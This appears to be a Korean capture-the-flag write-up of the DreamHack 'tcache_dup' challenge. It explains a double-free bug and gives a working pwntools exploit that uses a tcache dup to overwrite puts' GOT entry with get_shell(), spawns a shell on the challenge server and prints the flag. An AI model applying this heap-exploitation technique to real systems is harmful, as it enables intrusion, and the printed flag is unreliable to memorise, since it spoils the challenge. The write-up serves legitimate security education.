# [DreamHack] tcache_dup

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 작동하고 있는 서비스(tcache_dup)의 바이너리와 소스코드가 주어집니다.
> Tcache dup 공격 기법을 이용한 익스플로잇을 작성하여 셸을 획득한 후, “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [tcache_dup.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8549431/tcache_dup.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160313888-7619062d-4d12-4bf5-a939-1e74805aa1d6.png)

## Analysis

### create()

```c
    if(cnt > 10) {
        return -1; 
    }
```

`create()`에 인자로 전달되는 `cnt`는 `ptr`에 할당된 청크의 개수를 의미한다. `cnt`가 10보다 크면 함수를 종료한다. 청크를 해제해도 `cnt`가 줄어들지 않기 때문에, 최대 10번까지만 청크를 할당할 수 있다.

```c
    printf("Size: ");
    scanf("%d", &size);

    ptr[cnt] = malloc(size);

    if(!ptr[cnt]) {
        return -1;
    }
```

사이즈를 입력받고 그 크기만큼 `malloc()`으로 청크를 할당해서 `ptr[cnt]`에 저장한다. `malloc()`이 정상적으로 청크를 할당해주지 않으면 함수를 종료한다.

```c
    printf("Data: ");
    read(0, ptr[cnt], size);
```

할당한 청크에 데이터를 입력받는다.

### delete()

```c
    printf("idx: ");
    scanf("%d", &idx);

    if(idx > 10) {
        return -1; 
    }
```

해제할 청크의 index를 입력받는다. 10보다 큰 값을 입력하면 함수를 종료한다.

```c
    free(ptr[idx]);
```

`ptr[idx]`에 저장된 청크를 해제한다. `ptr[idx]`를 0으로 초기화하지 않아서 DFB가 발생할 수 있다.

## Exploit

Partial RELRO 환경이므로 GOT overwrite가 가능하다. DFB를 이용하여 GOT에 fake chunk를 할당받고 `get_shell()`의 주소로 덮으면, 그 함수가 호출될 때 셸을 획득할 수 있다.

```
$ nc host1.dreamhack.games 16030
1. Create
2. Delete
> 1
Size: 10
Data: asdf
1. Create
2. Delete
> 2
idx: 0
1. Create
2. Delete
> 2
idx: 0
1. Create
2. Delete
>
```

최신 glibc 2.27 버전에서는 tcahce에 double free 검사가 추가되어서 하나의 tcache 내에서 double free가 불가능한데, 서버 환경에서는 위와 같이 double free를 시켜도 오류가 발생하지 않는 것을 확인할 수 있다.

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/tcache_dup')
else:
    r = remote('host1.dreamhack.games', 16030)

sla = r.sendlineafter
sa = r.sendafter


def Create(size, data):
    sla('> ', '1')
    sla('Size: ', str(size))
    sa('Data: ', data)


def Delete(idx):
    sla('> ', '2')
    sla('idx: ', str(idx))


puts_got = 0x601020  # GOT of puts()
get_shell = 0x400ab0  # get_shell()


Create(0x18, 'a')  # idx: 0
Delete(0)
Delete(0)

Create(0x18, p64(puts_got))
Create(0x18, 'a')
Create(0x18, p64(get_shell))  # overwrite GOT of puts() with get_shell()


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 16030: Done
[*] Switching to interactive mode
$ cat flag
DH{11203ceeb905ad94be39c7a1e3b6a540}
```